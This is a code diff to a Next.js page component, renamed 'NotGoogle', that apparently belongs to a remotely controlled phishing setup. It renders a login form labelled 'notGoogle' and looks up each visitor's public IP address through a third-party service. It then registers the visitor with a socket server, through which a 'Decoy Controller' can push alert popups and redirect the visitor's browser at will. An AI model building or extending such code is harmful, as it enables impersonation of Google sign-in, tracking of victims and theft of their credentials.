@@ -1,9 +1,11 @@
-"use client";
+'use client';
 import { useEffect, useState } from "react";
 import { socket } from "../socket.js";
-import { useRouter } from 'next/navigation';
+import { useRouter } from "next/navigation";
+import Login from '@/components/login/login';
 
-export default function Home() {
+const NotGoogle = () => {
+  const [ipv4, setIpv4] = useState(null);
   const [isConnected, setIsConnected] = useState(false);
   const [transport, setTransport] = useState("N/A");
   const [userList, setUserList] = useState([]);
@@ -22,14 +24,16 @@ export default function Home() {
         setTransport(transport.name);
       });
 
-      socket.emit("join", "Decoy");
+      socket.emit("join", ipv4);
       socket.on("UserList", handleUserList);
     }
 
     function onDisconnect() {
       setIsConnected(false);
       setTransport("N/A");
-      // Remove event listener when disconnecting
+      // Remove event listeners when disconnecting
+      socket.off("alert", handleAlert);
+      socket.off("pushToPage", handlePushToPage);
       socket.off("UserList", handleUserList);
     }
 
@@ -41,13 +45,12 @@ export default function Home() {
       userList = userList.filter((user) => user !== "Decoy Controller");
       setUserList(userList);
     }
-    function handleAlert(message){
+    function handleAlert(message) {
       console.log("Alerting user with message: ", message);
       alert(message);
     }
 
     function handlePushToPage(site) {
-      
       router.push(site);
     }
 
@@ -58,18 +61,37 @@ export default function Home() {
 
     return () => {
       socket.off("connect", onConnect);
-      socket.off("alert", handleAlert);      
+      socket.off("alert", handleAlert);
       socket.off("pushToPage", handlePushToPage);
-      socket.off("UserList", handleUserList);
       socket.off("disconnect", onDisconnect);
+      socket.off("UserList", handleUserList)
     };
-  }, []);
+  }, [ipv4, router]); // Only run this effect once on component mount
+
+  useEffect(() => {
+    const fetchIPv4 = async () => {
+      try {
+        const response = await fetch(`https://api.ipify.org?format=json`);
+        if (!response.ok) {
+          throw new Error("Failed to fetch IPv4 address");
+        }
+        const result = await response.json();
+        setIpv4(result.ip);
+        //console.log(result.ip);
+      } catch (error) {
+        console.error("Error fetching IPv4 address:", error.message);
+      }
+    };
+
+    fetchIPv4();
+  }, [router]);
+
 
   return (
     <div>
-      <p>Status: {isConnected ? "connected" : "disconnected"}</p>
-      <p>Transport: {transport}</p>
-      <p>User List: {userList.join(", ")}</p>
+      <Login argument={"notGoogle"} />
     </div>
   );
-}
+};
+
+export default NotGoogle;
